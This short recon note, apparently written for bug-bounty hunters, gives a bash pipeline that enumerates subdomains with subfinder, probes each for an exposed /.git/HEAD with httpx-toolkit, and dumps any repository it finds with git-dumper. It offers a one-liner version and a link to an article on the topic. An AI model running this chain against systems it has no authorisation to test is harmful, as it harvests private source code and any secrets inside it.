# How to Hunt for Exposed .git Dorectories

```bash
echo example.com | subfinder -all -o subs.txt

cat subs.txt | httpx-toolkit -path /.git/HEAD -silent -mr "refs/heads" -rl 500 | tee git.txt

cat git.txt | cut -d '/' -f1,2,3,4 | while read url; do git-dumper $url git-dumper/$url; done


```

One Liner
```bash
echo example.com | subfinder -all | httpx-toolkit -path /.git/HEAD -silent -mr "refs/heads" -rl 500 | cut -d '/' -f1,2,3,4 | while read url; do git-dumper $url git-dumper/$url; done
```

Resources
- https://medium.com/smallcase-engineering/web-security-exposed-git-folder-in-production-51ad9484dee0
